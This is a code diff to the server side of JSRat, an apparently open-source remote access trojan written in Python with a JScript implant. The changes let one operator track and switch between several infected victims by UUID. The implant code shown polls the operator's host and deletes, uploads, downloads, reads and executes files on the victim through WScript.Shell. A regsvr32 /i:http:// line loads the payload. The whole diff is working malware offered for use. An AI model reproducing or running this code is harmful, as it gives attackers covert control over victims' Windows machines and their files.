@@ -30,12 +30,13 @@ from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 from classes.colors import *
 import requests # Used for --find-ip option, otherwise not needed
 
+import uuid
+
 try:
   import readline
 except:
   error("No Python Readline");
   pad(); bad("No history support as a result, sorry...");
-
 
 def banner():
   cls();
@@ -74,7 +75,7 @@ def external_ip():
   return extip.group()
 
 
-def jsrat():
+def jsrat(clientid):
   """
       Build & Return the core JS code to operate JSRat on victim
       Essentially serve up additional JS to be evaluated by client based on need
@@ -82,10 +83,11 @@ def jsrat():
   """
   jsrat_code = """
 			while(true) {
+                                myid = """ + "\"" + clientid + "\"" + """
 				h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
 				h.SetTimeouts(0, 0, 0, 0);
                         	try {
-					h.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
+					h.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/" + myid + "/rat",false);
 					h.Send();
 					c = h.ResponseText;
                             		if(c=="delete") {
@@ -95,7 +97,7 @@ def jsrat():
 					    	p.Send("[Next Input should be the File to Delete]");
                                 		g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                 		g.SetTimeouts(0, 0, 0, 0);
-                                		g.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
+                                		g.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/" + myid + "/rat",false);
 					    	g.Send();
 					    	d = g.ResponseText;
                                 		fso1=new ActiveXObject("Scripting.FileSystemObject");
@@ -113,7 +115,7 @@ def jsrat():
 					    	p.Send("[Next Input should be the File to download]");
                                 		g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                 		g.SetTimeouts(0, 0, 0, 0);
-                                		g.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
+                                		g.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/" + myid + "/rat",false);
 					    	g.Send();
 					    	d = g.ResponseText;
                                 		fso1=new ActiveXObject("Scripting.FileSystemObject");
@@ -132,7 +134,7 @@ def jsrat():
 					    	p.Send("[Next Input should be the File to Read]");
                                 		g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                 		g.SetTimeouts(0, 0, 0, 0);
-                                		g.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
+                                		g.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/" + myid + "/rat",false);
 					    	g.Send();
 					    	d = g.ResponseText;
                                 		fso1=new ActiveXObject("Scripting.FileSystemObject");
@@ -151,7 +153,7 @@ def jsrat():
 					    	p.Send("[Next Input should be the File to Run]");
                                 		g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                 		g.SetTimeouts(0, 0, 0, 0);
-                                		g.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
+                                		g.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/" + myid + "/rat",false);
 					    	g.Send();
 					    	d = g.ResponseText;
                                 		r = new ActiveXObject("WScript.Shell").Run(d,0,true);
@@ -203,7 +205,7 @@ def jsrat():
   return jsrat_code;
 
 
-def jsrat_regsrv():
+def jsrat_regsrv(clientid):
   """
       Build & Return the core JS code embedded inside of SCT file
 	Used to operate JSRat on victim when invoked via regsrc32 method
@@ -216,7 +218,7 @@ def jsrat_regsrv():
   jsrat_regsrv_code += '      classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >\n';
   jsrat_regsrv_code += '      <script language="JScript">\n';
   jsrat_regsrv_code += '        <![CDATA[\n\n';
-  jsrat_regsrv_code += jsrat();
+  jsrat_regsrv_code += jsrat(clientid);
   jsrat_regsrv_code += '        ]]>\n';
   jsrat_regsrv_code += "      </script>\n";
   jsrat_regsrv_code += "    </registration>\n";
@@ -236,6 +238,8 @@ def print_jsrat_help():
   print green("   upload") + white(" => ") + green("Upload File");
   print green(" download") + white(" => ") + green("Download File");
   print green("   delete") + white(" => ") + green("Delete File");
+  print green("   listid") + white(" => ") + green("List All Client");
+  print green("     goto") + white(" => ") + green("Go To Client Num");
   print green("     help") + white(" => ") + green("Help Menu");
   print green("     exit") + white(" => ") + green("Exit Shell");
   print
@@ -245,7 +249,7 @@ def print_jsrat_help():
 def get_user_input():
   try:
     while True:
-      usr_input = raw_input(red("$")+white("(")+blue("JSRat")+white(")")+red(">")+white(" "));
+      usr_input = raw_input(red("$")+white("(")+blue(str(nowcont) + ":" + client_type[idlist[nowcont]].split(',')[1] + "," + client_type[idlist[nowcont]].split(',')[0])+white(")")+red(">\n")+white(" "));
       if usr_input.strip() != "":
         break
       else:
@@ -271,14 +275,75 @@ class myHandler(BaseHTTPRequestHandler):
     """ Custom Log Handler to Spit out on to stderr """
     return
 
+  def dorat(self):
+    content_type = "text/plain";
+    response_message = get_user_input();
+    if response_message.strip().lower() == "help":
+        print_jsrat_help()
+        self.dorat()
+        return
+    elif response_message.strip().lower() == "exit":
+        global client_type
+        global idlist
+        global nowcont
+        if int(client_type[idlist[nowcont]].split(',')[0]) == 1:
+          print; caution("OK, sending rundll32 kill command to Client...")
+          response_message = "cmd.exe /c taskkill /f /im rundll32.exe";
+        else:
+          print; caution("OK, sending regsvr32 kill command to Client...")
+          response_message = "cmd.exe /c taskkill /f /im regsvr32.exe";
+        pad(); caution("Hit CTRL+C to kill server....")
+        data = list(client_type.keys())
+        for now in data:
+            if idlist.count(now) == 0:
+                del client_type[now]
+            elif now == idlist[nowcont]:
+                break
+
+        del client_type[idlist[nowcont]]
+        del idlist[nowcont]
+        if len(idlist) == nowcont:
+            nowcont -= 1
+    elif response_message.strip().lower() == "listid":
+        global client_type
+        global idlist
+        global nowcont
+#        print str(nowcont)
+        for i in range(len(idlist)):
+            data = client_type[idlist[i]].split(',')
+            if i == nowcont:
+                print cyan("> " + str(i) + ":" + data[1] + "," + data[0]);
+            else:
+                print cyan(" " + str(i) + ":" + data[1] + "," + data[0]);
+        self.dorat()
+        return
+
+    elif response_message.strip().lower().split(' ')[0] == "goto":
+        global nowcont
+        if nowcont < len(idlist):
+            nowcont = int(response_message.strip().lower().split(' ')[1])
+        response_message = ""
+    
+    self.send_response(200);
+    self.send_header('Content-type',content_type);
+    self.end_headers();
+    self.wfile.write(response_message);
+
+
+
   def do_GET(self):
     """
         Handle any GET requests coming into our server
     """
+    #print cyan(self.path)
     content_type = "text/plain";
-    response_message = jsrat();
+    response_message = "";
     if self.js_load_path == self.path:
       # invoked via rrundll32 method
+      global client_type
+      uuidd = uuid.uuid4()
+      client_type[str(uuidd)] = "1," + str(self.client_address[0])
+      response_message = jsrat(str(uuidd));
       good("Incoming JSRat rundll32 Invoked Client: %s" % str(self.client_address[0]));
       if 'user-agent' in self.headers.keys() and self.headers['user-agent'].strip() != "":
         pad(); good("User-Agent: %s" % self.headers['User-Agent'])
@@ -286,33 +351,16 @@ class myHandler(BaseHTTPRequestHandler):
 
     elif self.sct_load_path == self.path:
       global client_type
-      client_type = 2; # invoked via regsvr32 method
-      response_message = jsrat_regsrv();
+      uuidd = uuid.uuid4()
+      client_type[str(uuidd)] = "2," + str(self.client_address[0])
+      response_message = jsrat_regsrv(str(uuidd));
+      with open('data.txt', 'w') as f:
+          f.write(response_message)
       good("Incoming JSRat regsvr32 Invoked Client: %s" % str(self.client_address[0]));
       if 'user-agent' in self.headers.keys() and self.headers['user-agent'].strip() != "":
         pad(); good("User-Agent: %s" % self.headers['User-Agent'])
       print_jsrat_help();
 
-    elif "/rat" == self.path:
-      # Get input from server operator on what to do next...
-      response_message = get_user_input();
-      if response_message.strip().lower() == "help":
-        print_jsrat_help()
-        while True:
-          response_message = get_user_input();
-          if response_message.strip().lower() != "help":
-            break
-          else:
-            print
-      elif response_message.strip().lower() == "exit":
-        global client_type
-        if client_type == 1:
-          print; caution("OK, sending rundll32 kill command to Client...")
-          response_message = "cmd.exe /c taskkill /f /im rundll32.exe";
-        else:
-          print; caution("OK, sending regsvr32 kill command to Client...")
-          response_message = "cmd.exe /c taskkill /f /im regsvr32.exe";
-        pad(); caution("Hit CTRL+C to kill server....")
 
     elif "/uploadpath" == self.path:
       lpath = raw_input(red("$")+white("(")+blue("Enter Full Path for Local File to Upload")+white(")")+red(">")+white(" "));
@@ -360,11 +408,31 @@ regsvr32.exe /u /n /s /i:http://"""+bind_ip+":"+str(listener_port)+srv_sct+""" s
 """
       print cyan(response_message + "\n");
 
+#    print cyan(len(self.path.split('/')))
+    if 3 == len(self.path.split('/')):
+      if self.path.split('/')[2] == "rat":
+#          print cyan("ok2\n")
+          global idlist
+          global nowcont
+          # Get input from server operator on what to do next...
+          if idlist.count(self.path.split('/')[1]) == 0:
+              idlist.append(self.path.split('/')[1])
+              if len(idlist) == 1:
+                  nowcont = 0
+          if idlist[nowcont] == self.path.split('/')[1]:
+              self.dorat()
+          else:
+              self.send_response(200);
+              self.send_header('Content-type',content_type);
+              self.end_headers();
+              self.wfile.write('');
+
+    else:          
     # Send the built response back to client
-    self.send_response(200);
-    self.send_header('Content-type',content_type);
-    self.end_headers();
-    self.wfile.write(response_message);
+        self.send_response(200);
+        self.send_header('Content-type',content_type);
+        self.end_headers();
+        self.wfile.write(response_message);
 
 
   def do_POST(self):
@@ -491,7 +559,11 @@ else:
   delimiter = "/";
 
 global client_type;
-client_type=1;
+global idlist;
+global nowcont;
+client_type={}
+idlist = []
+nowcont = -1
 srv_url    = options.url;     # The URL path to start rundll32 client invocation
 srv_sct    = "/"+options.sct;     # The SCT Filename to start regsvr32 client invoke
 verbose    = options.verbose; # Enable verbose output for debugging purposes
